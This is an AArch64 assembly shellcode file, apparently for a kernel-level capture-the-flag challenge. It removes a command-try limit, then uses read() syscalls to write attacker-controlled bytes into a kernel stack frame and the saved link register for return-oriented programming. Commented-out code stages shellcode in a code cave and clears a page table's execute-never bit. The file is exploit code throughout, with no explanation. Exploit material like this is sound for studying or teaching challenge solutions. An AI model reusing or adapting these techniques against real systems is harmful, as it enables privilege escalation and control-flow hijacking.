NOP
NOP
NOP
NOP

// allocate stack space
STP X29, X30, [SP,#-0x20]!

// unlimit the number of cmd tries
MOV W1, #0xf0000000
STR W1, [SP, #0x10]

// write(1, buf, 1)
//MOV X2, #1
//LDR X1, =0xffffffffc0008c24
//MOV W0, W2
//MOV X8, #0x40
//SVC 0

// load shellcode
//MOV X9, #0
//// write address (shellcode cave)
//LDR X10, =0xffffffffc002a000
//
//// Remove banned character
//NOP
//NOP
//NOP
//NOP
//

// target the stack frame so we can ROP
LDR X10, =0xffffffffc0019c00

.loop:
    MOV X0, #0
    ADD X1, X10, X9
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0 // read(fd=0, buffer=target, n=1)

    ADD X9, X9, #1
    MOV X11, #0x10
    CMP X9, X11
B.MI .loop

// second level PTE for X10
//LDR X12, =0xffffffffc001e150

// write a byte to the PTE (remove XN byte)
//MOV X0, #0
//ADD X1, X12, #6
//MOV W2, #1
//MOV X8, #0x3f
//SVC 0

// write a byte to the PTE (remove XN byte)
//MOV X0, #0
//ADD X1, X12, #0
//MOV W2, #1
//MOV X8, #0x3f
//SVC 0

// saved LR - 0xffffffffc0019bb8
// value: 0xffffffffc000a830
LDR X10, =0xffffffffc0019bb8+1
NOP
//LDR X10, =0xffffffffc0019bba
// write a byte to stack frame saved LR
MOV X0, #0
ADD X1, X10, #0
MOV W2, #1
MOV X8, #0x3f
SVC 0

LDP X29, X30, [SP], 0x20
RET
